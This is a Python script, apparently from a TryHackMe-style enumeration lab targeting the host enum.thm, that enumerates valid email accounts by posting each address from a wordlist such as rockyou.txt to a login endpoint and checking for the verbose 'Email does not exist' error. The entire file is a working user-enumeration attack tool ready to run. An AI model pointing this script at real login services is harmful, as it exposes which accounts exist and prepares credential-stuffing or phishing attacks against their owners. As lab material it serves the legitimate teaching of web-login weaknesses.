# Use this to script to check for valid email address
# Usage: ptyhon3 valid_email_script.py rockyou.txt (or password list)


import argparse
import requests
import sys
import os

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message for invalid emails

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

def main():
    # Set up argument parser
    parser = argparse.ArgumentParser(description="Enumerate emails from a file and check if they are valid.")
    
    # Add argument for the input file
    parser.add_argument("email_file", help="Path to the file containing email addresses")
    
    # Parse command-line arguments
    args = parser.parse_args()

    # Check if file exists
    if not os.path.isfile(args.email_file):
        print(f"Error: The file '{args.email_file}' does not exist.")
        sys.exit(1)

    # Enumerate emails from the provided file
    valid_emails = enumerate_emails(args.email_file)

    # Print valid emails
    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)

if __name__ == "__main__":
    main()
